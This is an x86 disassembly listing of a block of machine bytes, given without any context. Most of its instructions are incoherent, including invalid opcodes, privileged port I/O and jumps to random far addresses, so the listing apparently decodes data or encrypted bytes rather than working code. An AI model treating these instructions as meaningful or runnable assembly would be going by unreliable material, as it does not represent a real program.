  4047c1:	idiv   BYTE PTR [eax-0x5242108]
  4047c7:	fmul   st(2),st
  4047c9:	out    dx,al
  4047ca:	fdivr  QWORD PTR [edi+0x4e2d0]
  4047d0:	ret    0xad0
  4047d3:	retf   0xcbc
  4047d6:	aam    0xcb
  4047d8:	pandn  mm5,QWORD PTR [eax-0xa42084d]
  4047df:	int    0xc5
  4047e1:	in     al,dx
  4047e2:	xlat   BYTE PTR ds:[ebx]
  4047e3:	idiv   DWORD PTR [esi-0xb234b31]
  4047e9:	in     al,dx
  4047ea:	rol    DWORD PTR [eax],1
  4047ec:	hlt    
  4047ed:	add    al,0xf3
  4047ef:	rcr    bh,cl
  4047f1:	or     eax,DWORD PTR [edi]
  4047f3:	add    eax,0xcc0209f9
  4047f8:	icebp  
  4047f9:	rcl    ecx,0xef
  4047fc:	in     al,0xe2
  4047fe:	xlat   BYTE PTR ds:[ebx]
  4047ff:	ret    
  404800:	int    0xed
  404802:	shl    edi,cl
  404804:	(bad)  
  404805:	mov    ecx,0xb7b9f9bd
  40480a:	cmc    
  40480b:	fidivr DWORD PTR [eax+0x4e0c3c1]
  404811:	or     al,dl
  404813:	sti    
  404814:	jecxz  0x404800
  404816:	push   edx
  404818:	jmp    0xc1c8:0xa8c0bfd1
  40481f:	loopne 0x4047f6
  404821:	mov    ebx,0xdad9ecb6
  404826:	retf   0xd5ce
  404829:	mov    bh,0xd2
  40482b:	rol    DWORD PTR [eax],0xbf
  40482e:	neg    esp
  404830:	push   es
  404831:	lock add eax,DWORD PTR [edx]
  404834:	(bad)  
  404835:	jmp    0xc7405c27
  40483a:	shr    bl,cl
  40483c:	call   0xd1121917
  404841:	rol    bh,1
  404843:	sar    edx,cl
  404845:	fdiv   QWORD PTR [esi-0x29fe3c23]
  40484b:	mov    esi,0xf5d3dcdc
  404850:	fild   DWORD PTR [ecx]
  404852:	or     eax,ebx
  404854:	jecxz  0x40485d
  404856:	or     al,BYTE PTR [eax]
  404858:	or     BYTE PTR [ecx-0x1d3e4148],bh
  40485e:	(bad)
  404861:	mov    bl,0xb4
  404863:	sti    
  404864:	sti    
  404865:	sar    cl,cl
  404867:	fdiv   st,st(1)
  404869:	ret    
  40486a:	fmul   st(6),st
  40486c:	rol    BYTE PTR ds:0xdaf1e2e0,1
  404872:	fdivr  st,st(3)
  404874:	out    0xe4,eax
  404876:	in     al,dx
  404877:	out    0xce,al
  404879:	les    edi,FWORD PTR [edi-0x3f2e1e3a]
  40487f:	retf   0xc5c1
  404882:	fmul   st,st(3)
  404884:	mov    ebx,0xd1fcd2ff
  404889:	mov    bh,0xfb
  40488b:	out    dx,eax
  40488c:	add    esp,esi
  40488e:	loopne 0x404892
  404890:	add    ecx,esi
  404892:	out    0xf4,al
  404894:	push   cs
  404895:	ret    
  404896:	stc    
  404897:	iret   
  404898:	jmp    0xcbf81590
  40489d:	loope  0x404866
  40489f:	aad    0xda
  4048a1:	aad    0xd1
  4048a3:	(bad)  
  4048a6:	mov    ecx,0xdebff6bd
  4048ab:	add    al,BYTE PTR [ebx]
  4048ad:	add    bl,dl
  4048af:	in     eax,0xf4
  4048b1:	loop   0x40488e
  4048b3:	cli    
  4048b4:	loop   0x4048bc
  4048b6:	les    ecx,FWORD PTR [eax]
  4048b8:	out    0xdc,eax
  4048ba:	leave  
  4048bb:	scas   al,BYTE PTR es:[edi]
  4048bc:	lock loope 0x40488b
  4048bf:	retf   
  4048c0:	mov    cl,0xc1
  4048c2:	clc    
  4048c3:	mov    edx,0xebf3e5ed
  4048c8:	int3   
  4048c9:	ret    0xffc3
  4048cc:	rcr    al,cl
  4048ce:	mov    ebp,0xd5e206b9
  4048d3:	sar    bl,0xe7
  4048d6:	in     eax,0x3
  4048d8:	jmp    0xf1cb:0xafc1b1e0
  4048df:	into   
  4048e0:	(bad)  
  4048e1:	in     eax,0xc0
  4048e3:	out    0xb6,al
  4048e5:	fcmovu st,st(7)
  4048e7:	mov    ebp,0xd80002c3
  4048ec:	aad    0x1
  4048ee:	icebp  
  4048ef:	loope  0x4048d2
  4048f1:	cli    
  4048f2:	enter  0x907,0xca
  4048f6:	into   
  4048f7:	pop    es
  4048f8:	fstp   st(4)
  4048fa:	ret    
  4048fb:	fmul   st(7),st
  4048fd:	iret   
  4048fe:	icebp  
  4048ff:	in     eax,0xfa
  404901:	mov    ch,0xbb
  404903:	retf   0xb9bb
  404906:	aam    0xdb
  404908:	(bad)  
  404909:	(bad)  
  40490a:	cli    
  40490b:	std    
  40490c:	not    ecx
  40490e:	add    eax,0xd5fef9c0
  404913:	in     al,0xee
  404915:	in     al,0xc
  404917:	clc    
  404918:	pop    es
  404919:	(bad)  
  40491a:	leave  
  40491b:	rcl    edx,cl
  40491d:	shl    DWORD PTR [ebx-0x4507061d],cl
  404923:	hlt    
  404924:	clc    
  404925:	shr    bh,cl
  404927:	jecxz  0x404900
  404929:	cmc    
  40492a:	int3   
  40492b:	fxch   st(5)
  40492d:	mov    edi,0xf6d0fad0
  404932:	pop    es
  404933:	neg    bl
  404935:	leave  
  404936:	stc    
  404937:	push   es
  404938:	retf   0xd1d9
  40493b:	icebp  
  40493c:	fnsave [ebx-0x3f17341e]
  404942:	enter  0xe5b1,0xfb
  404946:	call   0xfdf84216
  40494b:	pop    es
  40494c:	cli    
  40494d:	cmc    
  40494e:	mov    esp,0xd4f8c604
  404953:	(bad)  
  404954:	push   cs
  404955:	aad    0xe6
  404957:	or     DWORD PTR [ecx],edx
  404959:	ret    0xe2c0
  40495c:	shl    BYTE PTR [esi-0x302d0929],cl
  404962:	fistp  QWORD PTR [eax-0x472e0e08]
  404968:	fadd   st,st(3)
  40496a:	mov    edx,0xc5e1d7dd
  40496f:	add    eax,0xdff905f7
  404974:	in     eax,dx
  404975:	(bad)
  404978:	enter  0xa9a9,0xcc
  40497c:	(bad)
  40497f:	shl    edi,cl
  404981:	mov    bh,0xd4
  404983:	mov    edi,0xd2ccdbf5
  404988:	repz not ch
  40498b:	std    
  40498c:	sti    
  40498d:	mov    esp,0xd407c6f5
  404992:	fadd   st(1),st
  404994:	out    dx,eax
  404995:	or     al,0xea
  404997:	jmp    0xe1fff69e
  40499c:	retf   
  40499d:	retf   0xfae7
  4049a0:	lods   al,BYTE PTR ds:[esi]
  4049a1:	retf   
  4049a2:	rcl    bh,0xcb
  4049a5:	rcr    ecx,cl
  4049a7:	out    dx,eax
  4049a8:	clc    
  4049a9:	fcom   st(3)
  4049ab:	out    dx,al
  4049ac:	repz stc 
  4049ae:	test   edi,0xfbe9d5e5
  4049b4:	cli    
  4049b5:	retf   
  4049b6:	int3   
  4049b7:	cli    
  4049b8:	loope  0x404997
  4049ba:	ret    
  4049bb:	repnz retf 0xe6e4
  4049bf:	in     eax,0xec
  4049c1:	in     al,dx
  4049c2:	out    dx,eax
  4049c3:	rcl    ah,cl
  4049c5:	mov    esi,0xecf1edcf
  4049ca:	cli    
  4049cb:	out    0xe1,eax
  4049cd:	mov    ebx,0xf6c1e0d7
  4049d2:	jmp    0xd9e0:0xcbfbfdfe
  4049d9:	repnz fsub st(1),st
  4049dc:	test   al,0xf7
  4049de:	(bad)  
  4049df:	cli    
  4049e0:	shl    BYTE PTR [esi+ebp*8-0x1b2f0f53],1
  4049e7:	not    ch
  4049e9:	loopne 0x4049ea
  4049eb:	jecxz  0x4049de
  4049ed:	pop    es
  4049ee:	aad    0xd9
  4049f0:	shl    cl,0xa
  4049f3:	add    DWORD PTR [edx],ecx
  4049f5:	add    BYTE PTR [ecx],cl
  4049f7:	(bad)  
  4049f8:	cli    
  4049f9:	jmp    0xc22907d6
  4049fe:	rep lods eax,DWORD PTR ds:[esi]
  404a00:	mov    bh,0xfb
  404a02:	(bad)  
  404a03:	mov    eax,0xbd03edc5
  404a08:	jmp    0xd0fa08df
  404a0d:	fcomi  st,st(0)
  404a0f:	fcmovnu st,st(0)
  404a11:	(bad)  
  404a12:	(bad)  [edx]
  404a14:	(bad)  
  404a15:	(bad)  
  404a16:	call   0xc11148e0
  404a1b:	retf   
  404a1c:	ret    0xcde0
  404a1f:	mov    bh,0xd0
  404a21:	in     eax,0xc0
  404a23:	out    dx,eax
  404a24:	imul   cl
  404a26:	repnz repz jmp 0xf0f0:0xc1d9fffc
  404a2f:	fistp  QWORD PTR [edi+eiz*8-0x3b351925]
  404a36:	out    dx,al
  404a37:	repnz cld 
  404a39:	test   al,0xc8
  404a3b:	iret   
  404a3c:	icebp  
  404a3d:	mov    bl,0xf4
  404a3f:	fidiv  DWORD PTR [edi-0x49193f0e]
  404a45:	div    al
  404a47:	retf   0xd2fd
  404a4a:	(bad)  
  404a4b:	fdivp  st(3),st
  404a4d:	repnz add bl,ah
  404a50:	test   BYTE PTR [ebx],0xf8
  404a53:	dec    BYTE PTR [edx]
  404a55:	fsubr  st(4),st
  404a57:	out    dx,eax
  404a58:	add    bh,BYTE PTR [esi-0x2b190f42]
  404a5e:	mov    al,0xfa
  404a60:	enter  0xc9e6,0xad
  404a64:	div    BYTE PTR [esi-0x37332315]
  404a6a:	ret    
  404a6b:	clc    
  404a6c:	shl    cl,0xd0
  404a6f:	add    al,0xb8
  404a71:	(bad)  
  404a72:	jmp    0x93f1f4c
  404a77:	or     eax,0xafdce706
  404a7c:	shr    bl,cl
  404a7e:	call   0xd1f52d4f
  404a83:	sar    DWORD PTR [eax-0x36330213],1
  404a89:	jecxz  0x404a5c
  404a8b:	add    BYTE PTR [eax],al
  404a8d:	repz repz repnz (bad) 
  404a92:	fisttp DWORD PTR [ecx]
  404a94:	add    dl,ah
  404a96:	jmp    0xdeec3583
  404a9b:	ret    
  404a9c:	out    dx,al
  404a9d:	leave  
  404a9e:	mov    bl,0xc1
  404aa0:	leave  
  404aa1:	cmc    
  404aa2:	(bad)  
  404aa3:	retf   
  404aa4:	(bad)  
  404aa5:	sti    
  404aa6:	lock (bad) 
  404aa9:	out    dx,eax
  404aaa:	repnz push es
  404aac:	fdivrp st(6),st
  404aae:	rol    bh,0xb8
  404ab1:	add    eax,0xdae1d7d5
  404ab6:	(bad)  
  404ab7:	stc    
  404ab8:	in     al,0xc9
  404aba:	(bad)  
  404abb:	test   al,0xe8
  404abd:	aam    0xf3
  404abf:	repnz cmc 
  404ac1:	(bad)  
  404ac2:	rcr    dl,cl
  404ac4:	cmc    
  404ac5:	mov    ah,0xcc
  404ac7:	retf   0xf2da
  404aca:	call   0xc32710d6
  404acf:	jmp    0xe4dd:0xbdead8e1
  404ad6:	int    0xfe
  404ad8:	fsubr  DWORD PTR [ebp-0x17313856]
  404ade:	mov    bh,0xca
  404ae0:	(bad)  
  404ae3:	mov    ecx,0xd7cbfed4
  404ae8:	sar    cl,cl
  404aea:	ror    ah,1
  404aec:	add    eax,0xeb03f1ec
  404af1:	fstp   st(1)
  404af3:	cli    
  404af4:	out    0xf,eax
  404af6:	pop    es
  404af7:	loope  0x404aea
  404af9:	mov    ebp,0xdcebefca
  404afe:	mov    ch,0xcb
  404b00:	into   
  404b01:	jmp    0xd9e4:0xffd5ecca
  404b08:	cli    
  404b09:	cmc    
  404b0a:	(bad)  
  404b0c:	std    
  404b0d:	add    esi,edi
  404b0f:	jmp    0xc0e:0xf5dfc50a
  404b16:	add    eax,0xddebefc1
  404b1b:	mov    cl,0xe0
  404b1d:	cmc    
  404b1e:	in     eax,dx
  404b1f:	repz jmp 0xc5f11b1d
  404b25:	into   
  404b26:	mov    edx,0xc1fbe2dd
  404b2b:	mov    esi,0xbcecdbfa
  404b30:	mov    edi,0xfedcfed7
  404b36:	out    0xd,eax
  404b38:	rol    ch,cl
  404b3a:	mov    eax,0xd3b5b0cc
  404b3f:	in     al,dx
  404b40:	repz mov dh,0xf2
  404b43:	cli    
  404b44:	fcmovu st,st(3)
  404b46:	mov    ch,0xcb
  404b48:	in     al,dx
  404b49:	into   
  404b4a:	fcmovb st,st(7)
  404b4c:	aad    0xbe
  404b4e:	mov    edx,0xc7ca01f9
  404b53:	jmp    0x11a4c3a
  404b58:	push   es
  404b59:	ret    
  404b5a:	in     al,dx
  404b5b:	out    0xc8,eax
  404b5d:	out    dx,al
  404b5e:	mul    bh
  404b60:	hlt    
  404b61:	idiv   DWORD PTR [eax-0x3632114f]
  404b67:	sti    
  404b68:	lock clc 
  404b6a:	add    ecx,esp
  404b6c:	stc    
  404b6d:	pop    es
  404b6e:	rcl    esi,1
  404b70:	loope  0x404b55
  404b72:	pop    es
  404b73:	imul   dl
  404b75:	retf   
  404b76:	in     eax,0xfd
  404b78:	out    0xaf,eax
  404b7a:	ror    ecx,1
  404b7c:	test   al,0xd4
  404b7e:	mov    dh,0xe7
  404b80:	aad    0xe5
  404b82:	sti    
  404b83:	clc    
  404b84:	shl    bh,cl
  404b86:	hlt    
  404b87:	jecxz  0x404b44
  404b89:	mov    ebx,0xbfb4e3c0
  404b8e:	(bad)
  404b92:	fucomp st(6)
  404b94:	(bad)  
  404b96:	in     eax,dx
  404b97:	int3   
  404b98:	stc    
  404b99:	mov    edi,0xf4d1d7ce
  404b9e:	cmc    
  404b9f:	int3   
  404ba0:	imul   bl
  404ba2:	jmp    0xbc263057
  404ba7:	fcompp 
  404ba9:	into   
  404baa:	fstp   st(2)
  404bac:	(bad)  
  404bad:	mov    ebp,0xe2d0f6db
  404bb2:	test   bh,0xc8
  404bb5:	jecxz  0x404b9d
  404bb7:	std    
  404bb8:	jmp    0xadac:0xf0c0d1ef
  404bbf:	aad    0xb6
  404bc1:	sar    dl,0xf4
  404bc4:	out    dx,al
  404bc5:	(bad)  
  404bc7:	mov    ebp,0xfec0ccd7
  404bcc:	rcl    dh,0xe5
  404bcf:	in     al,0xdb
  404bd1:	fmul   QWORD PTR [ebx]
  404bd3:	add    al,0xe1
  404bd5:	add    ecx,ebp
  404bd7:	adc    ebp,ecx
  404bd9:	mov    ebp,0xd5eaf6a6
  404bde:	shr    bh,0xf9
  404be1:	iret   
  404be2:	icebp  
  404be3:	shl    ah,cl
  404be5:	xlat   BYTE PTR ds:[ebx]
  404be6:	sti    
  404be7:	aad    0xe2
  404be9:	add    cl,dl
  404beb:	neg    al
  404bed:	cli    
  404bee:	(bad)  
  404bef:	repz shr bl,0xfd
  404bf3:	pop    es
  404bf4:	(bad)  
  404bf5:	sti    
  404bf6:	loop   0x404bcb
  404bf8:	icebp  
  404bf9:	ret    0xb1f1
  404bfc:	iret   
  404bfd:	in     eax,dx
  404bfe:	into   
  404bff:	test   al,0xb4
  404c02:	into   
  404c03:	idiv   DWORD PTR [ebx-0x11090948]
  404c09:	clc    
  404c0a:	stc    
  404c0b:	lock aam 0xe5
  404c0e:	aad    0x3
  404c10:	jmp    0x93c0b0e
  404c15:	add    cl,BYTE PTR [edi]
  404c17:	cli    
  404c18:	into   
  404c19:	jmp    0xae360cf5
  404c1e:	(bad)  
  404c1f:	sar    edx,1
  404c21:	icebp  
  404c22:	jmp    ebp
  404c24:	mov    dh,0xce
  404c26:	mov    eax,0xc1fef3d0
  404c2b:	sar    edx,0xe0
  404c2e:	fadd   st(7),st
  404c30:	hlt    
  404c31:	std    
  404c32:	loopne 0x404bf4
  404c34:	or     cl,ch
  404c36:	jecxz  0x404c21
  404c38:	or     esi,DWORD PTR [ebx-0x1542111c]
  404c3e:	loopne 0x404c27
  404c40:	aam    0xaf
  404c42:	test   esi,0xf4e4eed1
  404c48:	cld    
  404c49:	fdivp  st(5),st
  404c4b:	stc    
  404c4c:	fiadd  DWORD PTR [esi]
  404c4e:	add    esi,eax
  404c50:	in     al,0xff
  404c52:	mov    esi,0x5eff40f
  404c57:	adc    cl,ah
  404c59:	ret    0xc6b0
  404c5c:	(bad)  
  404c5d:	fdiv   QWORD PTR [edx-0x2c282938]
  404c63:	retf   
  404c64:	retf   0xd9f4
  404c67:	retf   0xc2b0
  404c6a:	loop   0x404c48
  404c6c:	fabs   
  404c6e:	inc    DWORD PTR [eax]
  404c70:	aam    0xde
  404c72:	fucomi st,st(3)
  404c74:	jmp    0x404c4f
  404c76:	out    dx,eax
  404c77:	or     al,0xd9
  404c79:	mov    esi,0xccc2ebb3
  404c7e:	mov    cl,0xe3
  404c80:	out    0xbb,eax
  404c82:	lock out 0xf1,eax
  404c85:	icebp  
  404c86:	ror    ebx,1
  404c88:	fadd   st(2),st
  404c8a:	fdivr  QWORD PTR [esi-0x24f80820]
  404c90:	xlat   BYTE PTR ds:[ebx]
  404c91:	fucomp st(7)
  404c93:	or     ebx,esp
  404c95:	push   es
  404c96:	ret    0xd907
  404c99:	jmp    0x404c5b
  404c9b:	call   0xe635fe93
  404ca0:	call   0xfe002469
  404ca5:	idiv   DWORD PTR [ebp-0x4280c]
  404cab:	cli    
  404cac:	fsubr  st(7),st
  404cae:	mov    edx,0xf6e5e505
  404cb3:	out    dx,al
  404cb4:	add    ebp,ebx
  404cb6:	std    
  404cb7:	sti    
  404cb8:	out    dx,al
  404cb9:	ffree  st(4)
  404cbb:	lods   eax,DWORD PTR ds:[esi]
  404cbc:	mov    esi,0xb5cdd3ca
  404cc1:	aam    0xf7
  404cc3:	mov    ebx,0xb1b4fac6
  404cc8:	mov    eax,0xdfd4f2c1
  404ccd:	add    ah,al
  404ccf:	push   edi
  404cd1:	fsub   st(1),st
  404cd3:	(bad)  
  404cd4:	out    0xf,al
  404cd6:	jmp    0x404cdd
  404cd8:	fcompp 
  404cda:	scas   al,BYTE PTR es:[edi]
  404cdb:	(bad)
  404cde:	hlt    
  404cdf:	jmp    0x404cca
  404ce1:	idiv   DWORD PTR [edx-0x404b4748]
  404ce7:	jmp    0xe4113ce0
  404cec:	fcomp  st(1)
  404cee:	add    al,0xd1
  404cf0:	or     ebp,eax
  404cf2:	enter  0xcff8,0xe3
  404cf6:	in     al,0xe8
  404cf8:	cld    
  404cf9:	(bad)  
  404cfb:	test   dl,0xb2
  404cfe:	(bad)  
  404cff:	cmc    
  404d00:	mov    ch,0xd0
  404d02:	cli    
  404d03:	jmp    0xdbdc:0xb8dee9cd
  404d0a:	sar    esi,1
  404d0c:	aam    0xff
  404d0e:	add    dl,dh
  404d10:	mul    ecx
  404d12:	or     bh,ch
  404d14:	out    dx,eax
  404d15:	out    dx,eax
  404d16:	in     eax,dx
  404d17:	out    dx,al
  404d18:	or     al,0xc4
  404d1a:	(bad)  
  404d1b:	repz (bad) 
  404d1d:	retf   0xebf3
  404d20:	jmp    0xd9b6:0xdab8e0d2
  404d27:	neg    esi
  404d29:	into   
  404d2a:	(bad)  
  404d2c:	aad    0x7
  404d2e:	(bad)  
  404d30:	cld    
  404d31:	fscale 
  404d33:	push   es
  404d34:	fiadd  WORD PTR ds:0xaef2ecdf
  404d3a:	out    dx,eax
  404d3b:	mov    bh,0xd3
  404d3d:	shr    esi,cl
  404d3f:	lods   al,BYTE PTR ds:[esi]
  404d40:	mov    dh,0xd3
  404d42:	jmp    0xfd0b1846
  404d47:	shr    esp,1
  404d49:	fdivp  st(7),st
  404d4b:	mov    ch,0xfd
  404d4d:	std    
  404d4e:	rol    BYTE PTR [esi],cl
  404d50:	repnz in eax,0xeb
  404d53:	add    al,0xf6
  404d55:	cmc    
  404d56:	jmp    0xefc2:0xcebde2cb
  404d5d:	rcl    ah,0xd1
  404d60:	xlat   BYTE PTR ds:[ebx]
  404d61:	mov    cl,0xf9
  404d63:	mov    al,0xf1
  404d65:	icebp  
  404d66:	int    0xe8
  404d68:	repnz cmc 
  404d6a:	shl    dh,0xd5
  404d6d:	add    ebx,eax
  404d6f:	add    edi,esp
  404d71:	fmul   DWORD PTR [ecx]
  404d73:	sti    
  404d74:	(bad)  
  404d76:	(bad)  
  404d78:	cld    
  404d79:	mov    ecx,0xe3c8d2ed
  404d7e:	shr    esp,cl
  404d80:	retf   0xe9b6
  404d83:	clc    
  404d84:	fmulp  st(4),st
  404d86:	sar    ah,1
  404d88:	clc    
  404d89:	fmulp  st(0),st
  404d8b:	out    dx,eax
  404d8c:	loop   0x404d6b
  404d8e:	mov    edx,0xc4f6f6bc
  404d93:	add    al,BYTE PTR [ecx]
  404d95:	iret   
  404d96:	or     ecx,edx
  404d98:	shr    ah,cl
  404d9a:	jmp    0xd1b7:0xd7e3c6be
  404da1:	aad    0xd2
  404da3:	int3   
  404da4:	mov    ch,0xd1
  404da6:	mov    dh,0xeb
  404da8:	sti    
  404da9:	int    0xd7
  404dab:	out    0xe7,al
  404dad:	div    esp
  404daf:	shl    esp,1
  404db1:	or     al,ah
  404db3:	fcmovnu st,st(6)
  404db5:	or     ebp,ebp
  404db7:	cli    
  404db8:	fidiv  WORD PTR [ecx-0x542d2924]
  404dbe:	out    0xcd,eax
  404dc0:	repnz enter 0xd7c0,0xed
  404dc5:	int3   
  404dc6:	repz sti 
  404dc8:	mov    esp,0xd2bfcdd9
  404dcd:	repz add al,0xf6
  404dd0:	std    
  404dd1:	in     eax,0xd5
  404dd3:	retf   0xfedc
  404dd6:	add    bl,ch
  404dd8:	out    0xc0,al
  404dda:	loop   0x404da6
  404ddc:	int3   
  404ddd:	stos   DWORD PTR es:[edi],eax
  404dde:	mov    bh,0xc9
  404de0:	mov    cl,0xd5
  404de2:	mov    ebx,0xbdbfcbeb
  404de7:	clc    
  404de8:	stc    
  404de9:	cld    
  404dea:	(bad)  
  404deb:	mov    ecx,0xdfd201d9
  404df0:	shl    bh,1
  404df2:	fucomi st,st(7)
  404df4:	or     ebx,eax
  404df6:	fsin   
  404df8:	fdivr  st(1),st
  404dfa:	jmp    0xb4d4:0xc3b7f3b0
  404e01:	out    0xb0,al
  404e03:	out    dx,al
  404e04:	mov    al,0xe8
  404e06:	call   0xc343fec8
  404e0b:	aad    0xcd
  404e0d:	sar    BYTE PTR [edx-0xa0e1626],1
  404e13:	push   es
  404e14:	push   cs
  404e15:	loop   0x404dff
  404e17:	cli    
  404e18:	in     al,dx
  404e19:	loope  0x404ddd
  404e1b:	leave  
  404e1c:	in     al,dx
  404e1d:	loop   0x404e1a
  404e1f:	fstp   TBYTE PTR [edx-0x4652381f]
  404e25:	lock jecxz 0x404e0a
  404e28:	mov    ebp,0xf9bdb8ff
  404e2d:	icebp  
  404e2e:	int3   
  404e2f:	lock (bad) 
  404e31:	add    bh,BYTE PTR [esi-0x32ff1f39]
  404e37:	stc    
  404e38:	retf   
  404e39:	stos   BYTE PTR es:[edi],al
  404e3a:	shl    DWORD PTR [edi-0x3b4a2f1a],cl
  404e40:	neg    edx
  404e42:	shl    edx,cl
  404e44:	retf   0xf0e4
  404e47:	idiv   ebp
  404e49:	ret    
  404e4a:	fstp   TBYTE PTR [ebp-0xf03fa32]
  404e50:	cld    
  404e51:	or     al,ah
  404e53:	por    mm3,mm3
  404e56:	retf   
  404e57:	shr    esp,0xd0
  404e5a:	shr    dh,1
  404e5c:	mov    bh,0xec
  404e5f:	ret    0xfaf9
  404e62:	cmc    
  404e63:	cli    
  404e64:	jmp    0x404e62
  404e66:	ror    ebx,1
  404e68:	add    bh,BYTE PTR [edi-0x52a4228]
  404e6e:	(bad)  
  404e70:	in     eax,0x7
  404e72:	or     dh,bh
  404e74:	(bad)  
  404e75:	cli    
  404e76:	stc    
  404e77:	(bad)  
  404e79:	loop   0x404e2e
  404e7b:	fsub   QWORD PTR [ebp+ecx*8-0x3325320c]
  404e82:	into   
  404e83:	cli    
  404e84:	out    dx,eax
  404e85:	mov    ch,0xcc
  404e87:	mov    esp,0xe1edeff9
  404e8c:	loope  0x404e83
  404e8e:	cmc    
  404e8f:	lock retf 
  404e91:	or     eax,DWORD PTR [esi]
  404e93:	call   0x63d4da1
  404e98:	shr    ebx,cl
  404e9a:	ret    
  404e9b:	mov    edi,0xeddbe5d3
  404ea0:	enter  0xe5c5,0xd6
  404ea4:	mov    edi,0xbed5dfb5
  404ea9:	div    bh
  404eab:	repz sar cl,1
  404eae:	clc    
  404eaf:	add    edi,ebx
  404eb1:	add    ecx,ebx
  404eb3:	or     al,ch
  404eb5:	out    0xca,al
  404eb7:	fucom  st(4)
  404eb9:	(bad)  
  404eba:	lods   eax,DWORD PTR ds:[esi]
  404ebb:	bnd ret 0xb4e9
  404ebf:	int3   
  404ec0:	mov    edx,0xdeefbafa
  404ec5:	xlat   BYTE PTR ds:[ebx]
  404ec6:	iret   
  404ec7:	cli    
  404ec8:	(bad)  
  404eca:	not    ecx
  404ecc:	add    eax,0x5f1f5c6
  404ed1:	jmp    0x404ebe
  404ed3:	mov    ebp,0xf2ead8df
  404ed8:	fmul   st,st(2)
  404eda:	out    dx,eax
  404edb:	lods   eax,DWORD PTR ds:[esi]
  404edc:	out    0xe8,eax
  404ede:	cmc    
  404edf:	mov    ebx,0xb1ffdae0
  404ee4:	lock (bad) 
  404ee6:	std    
  404ee7:	(bad)  
  404ee8:	stc    
  404ee9:	sti    
  404eea:	iret   
  404eeb:	sar    ecx,0xd2
  404eee:	add    esi,ebp
  404ef0:	aad    0x1
  404ef2:	(bad)  
  404ef4:	push   cs
  404ef5:	in     eax,0x5
  404ef7:	out    dx,eax
  404ef8:	loop   0x404edb
  404efa:	mov    ecx,0xc6b2d6e7
  404f00:	fnstenv [eax-0x9082e0a]
  404f06:	hlt    
  404f07:	fmul   st,st(6)
  404f09:	repz int 0xfd
  404f0c:	lock std 
  404f0e:	(bad)  
  404f0f:	fnsetpm(287 only) 
  404f11:	retf   
  404f12:	retf   0xeec8
  404f15:	fscale 
  404f17:	fsubr  st(4),st
  404f19:	loop   0x404ec7
  404f1b:	in     al,0xb6
  404f1d:	in     al,0xcb
  404f1f:	imul   ebx
  404f21:	mov    dh,0xd5
  404f23:	mov    dh,0xb5
  404f25:	(bad)  
  404f26:	lock not ch
  404f29:	leave  
  404f2a:	loop   0x404ef3
  404f2c:	fcmovnb st,st(1)
  404f2e:	idiv   cl
  404f30:	or     bl,dh
  404f32:	cli    
  404f33:	clc    
  404f34:	(bad)  
  404f35:	iret   
  404f36:	add    al,0xdd
  404f38:	adc    ebp,ebp
  404f3a:	loope  0x404f08
  404f3c:	aad    0xcd
  404f3e:	lods   al,BYTE PTR ds:[esi]
  404f3f:	cli    
  404f40:	lock mov al,0xb4
  404f43:	jmp    0xe8fe:0xbafcd7d3
  404f4a:	repz test esi,0xd802e1bc
  404f51:	fadd   st(1),st
  404f53:	iret   
  404f54:	pop    es
  404f55:	loope  0x404f5f
  404f57:	in     al,0xe
  404f59:	(bad)  
  404f5b:	jmp    0xcdc1:0xb2d7ece5
  404f62:	(bad)  
  404f64:	cli    
  404f65:	sti    
  404f66:	add    esi,ecx
  404f68:	hlt    
  404f69:	add    ch,ah
  404f6b:	mov    eax,0xffecfa03
  404f70:	sar    esi,0xc7
  404f73:	aam    0xf4
  404f75:	mov    esi,0xadd8ecf8
  404f7b:	mov    esp,0xb1dbe3b3
  404f80:	int    0xd9
  404f82:	(bad)  
  404f84:	call   0xf60b2e3d
  404f89:	enter  0xcfd0,0x0
  404f8d:	add    edx,eax
  404f8f:	or     edx,esp
  404f91:	aam    0xeb
  404f93:	inc    DWORD PTR [esi]
  404f95:	stc    
  404f96:	out    0xf,al
  404f98:	pop    es
  404f99:	mov    esp,0xcab6dfdd
  404f9e:	shr    edi,cl
  404fa0:	cmc    
  404fa1:	aam    0xcc
  404fa3:	(bad)  
  404fa4:	(bad)
  404fa7:	aam    0xf8
  404fa9:	(bad)  
  404faa:	(bad)  
  404fab:	icebp  
  404fac:	cli    
  404fad:	cmc    
  404fae:	(bad)  
  404fb0:	rcl    dh,1
  404fb2:	cld    
  404fb3:	jecxz  0x404f80
  404fb5:	retf   
  404fb6:	call   0xd3fd3da1
  404fbb:	jmp    0xd5ca:0xe7cdbdbe
  404fc2:	in     eax,0xd1
  404fc4:	int3   
  404fc5:	stc    
  404fc6:	clc    
  404fc7:	mov    edx,0x2dd01ba
  404fcc:	in     eax,0xcd
  404fce:	add    al,0xe7
  404fd0:	retf   0xdbea
  404fd3:	rol    BYTE PTR [edi+ecx*8],0xf8
  404fd7:	repnz push cs
  404fd9:	ret    0xb3b8
  404fdc:	retf   0xf5e1
  404fdf:	div    dh
  404fe1:	mov    ecx,0xfbc6f1ef
  404fe6:	(bad)  [ebp-0x20323325]
  404fec:	aad    0xd4
  404fee:	loopne 0x404fe3
  404ff0:	loop   0x404fc2
  404ff2:	push   es
  404ff3:	cli    
  404ff4:	mov    esp,0x12c4f4e7
  404ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ffa:	out    0xca,al
  404ffc:	mov    ebp,0xaceefbcf
  405001:	into   
  405002:	int    0xda
  405004:	in     eax,0xfd
  405006:	out    dx,eax
  405007:	lock jmp 0xd5c3:0xd6fdd0ba
  40500f:	add    ch,bl
  405011:	or     BYTE PTR [eax],al
  405013:	aam    0xf
  405015:	bswap  esi
  405017:	fild   DWORD PTR [edi]
  405019:	(bad)
  40501d:	loope  0x404fe5
  40501f:	neg    bl
  405021:	scas   eax,DWORD PTR es:[edi]
  405022:	into   
  405023:	(bad)  
  405024:	fscale 
  405026:	iret   
  405027:	jmp    0x404fec
  405029:	mov    bh,0xd2
  40502b:	fistp  QWORD PTR [ebp+0x90afcc2]
  405031:	fiadd  WORD PTR [ecx]
  405033:	aad    0xd9
  405035:	cmc    
  405036:	add    DWORD PTR [ecx],eax
  405038:	loop   0x404feb
  40503a:	in     al,0xc8
  40503c:	ret    0xdbf7
  40503f:	icebp  
  405040:	loope  0x405010
  405042:	shl    DWORD PTR [esi-0x2441033],cl
  405048:	jecxz  0x405001
  40504a:	(bad)  
  40504b:	loopne 0x40504c
  40504d:	int3   
  40504e:	neg    edx
  405050:	inc    BYTE PTR ds:0xdbfb06e0
  405056:	fucom  st(3)
  405058:	repz in al,0xe7
  40505b:	shr    ebp,1
  40505d:	int    0xea
  40505f:	out    0xcf,al
  405061:	mov    ah,0xdb
